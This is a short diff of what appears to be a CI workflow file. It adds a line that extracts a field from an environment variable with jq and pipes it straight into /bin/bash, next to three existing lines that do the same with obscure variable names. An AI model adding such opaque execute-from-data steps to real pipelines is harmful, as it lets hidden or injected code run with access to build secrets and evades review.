@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$yv849" | jq -r .qxo82 | /bin/bash
           echo $p46553 | jq -r .b248 | /bin/bash
           printf '%s' "$tky09231" | jq -r .zaty20 | /bin/bash
+          echo $ipra2925 | jq -r .laz2 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
